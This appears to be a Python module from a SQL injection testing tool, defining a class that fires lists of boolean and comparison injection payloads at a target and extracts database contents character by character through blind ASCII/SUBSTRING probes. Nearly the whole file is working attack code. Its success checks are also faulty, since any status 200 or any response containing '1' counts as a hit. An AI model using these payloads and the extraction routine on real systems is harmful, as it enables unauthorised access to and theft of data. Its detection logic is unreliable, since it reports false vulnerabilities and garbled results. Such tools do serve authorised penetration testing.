import logging
import time
from typing import List, Dict, Any
from core.request_engine import RequestEngine
from core.payload_manager import PayloadManager

class BlindInjector:
    def __init__(self, request_engine: RequestEngine, payload_manager: PayloadManager):
        self.request_engine = request_engine
        self.payload_manager = payload_manager
        
    def test_all_parameters(self) -> List[Dict[str, Any]]:
        """Test all parameters for blind SQL injection vulnerabilities."""
        results = []
        
        # Test boolean-based blind injection
        boolean_results = self._test_boolean_blind()
        if boolean_results:
            results.extend(boolean_results)
            
        # Test comparison-based blind injection
        comparison_results = self._test_comparison_blind()
        if comparison_results:
            results.extend(comparison_results)
            
        return results
        
    def _test_boolean_blind(self) -> List[Dict[str, Any]]:
        """Test for boolean-based blind SQL injection."""
        results = []
        
        # Common boolean-based payloads
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "' OR 1=1 --",
            "' OR 1=1 #",
            "') OR ('1'='1",
            "') OR ('1'='1' --",
            "') OR ('1'='1' #",
            "')) OR (('1'='1",
            "')) OR (('1'='1' --",
            "')) OR (('1'='1' #"
        ]
        
        for payload in payloads:
            try:
                # Send request with payload
                response, _ = self.request_engine.send_request(payload=payload)
                
                # Check if response indicates successful injection
                if self._check_boolean_response(response):
                    results.append({
                        "type": "boolean_blind",
                        "payload": payload,
                        "status": "vulnerable"
                    })
                    
            except Exception as e:
                logging.error(f"Error testing boolean blind injection: {str(e)}")
                continue
                
        return results
        
    def _test_comparison_blind(self) -> List[Dict[str, Any]]:
        """Test for comparison-based blind SQL injection."""
        results = []
        
        # Common comparison-based payloads
        payloads = [
            "' AND 1=1 --",
            "' AND 1=1 #",
            "' AND '1'='1",
            "' AND '1'='1' --",
            "' AND '1'='1' #",
            "') AND (1=1",
            "') AND ('1'='1",
            "')) AND ((1=1",
            "')) AND (('1'='1"
        ]
        
        for payload in payloads:
            try:
                # Send request with payload
                response, _ = self.request_engine.send_request(payload=payload)
                
                # Check if response indicates successful injection
                if self._check_comparison_response(response):
                    results.append({
                        "type": "comparison_blind",
                        "payload": payload,
                        "status": "vulnerable"
                    })
                    
            except Exception as e:
                logging.error(f"Error testing comparison blind injection: {str(e)}")
                continue
                
        return results
        
    def _check_boolean_response(self, response) -> bool:
        """Check if response indicates successful boolean-based injection."""
        # Check for common indicators of successful injection
        indicators = [
            "true",
            "1",
            "success",
            "valid",
            "exists",
            "found"
        ]
        
        # Check response text for indicators
        response_text = response.text.lower()
        for indicator in indicators:
            if indicator in response_text:
                return True
                
        # Check response status code
        if response.status_code == 200:
            return True
            
        return False
        
    def _check_comparison_response(self, response) -> bool:
        """Check if response indicates successful comparison-based injection."""
        # Check for common indicators of successful injection
        indicators = [
            "true",
            "1",
            "success",
            "valid",
            "exists",
            "found"
        ]
        
        # Check response text for indicators
        response_text = response.text.lower()
        for indicator in indicators:
            if indicator in response_text:
                return True
                
        # Check response status code
        if response.status_code == 200:
            return True
            
        return False
        
    def extract_data_blind(self, query: str) -> str:
        """Extract data using blind SQL injection."""
        result = ""
        
        # Get length of result
        length = self._get_result_length(query)
        if not length:
            return result
            
        # Extract each character
        for i in range(1, length + 1):
            char = self._get_character(query, i)
            if char:
                result += char
                
        return result
        
    def _get_result_length(self, query: str) -> int:
        """Get length of query result using blind injection."""
        # Try different length values
        for length in range(1, 100):  # Limit to 100 characters
            payload = f"' AND (SELECT LENGTH(({query})))={length} --"
            
            try:
                response, _ = self.request_engine.send_request(payload=payload)
                if self._check_boolean_response(response):
                    return length
            except:
                continue
                
        return 0
        
    def _get_character(self, query: str, position: int) -> str:
        """Get character at specific position using blind injection."""
        # Try each ASCII character
        for char in range(32, 127):  # Printable ASCII characters
            payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))={char} --"
            
            try:
                response, _ = self.request_engine.send_request(payload=payload)
                if self._check_boolean_response(response):
                    return chr(char)
            except:
                continue
                
        return "" 
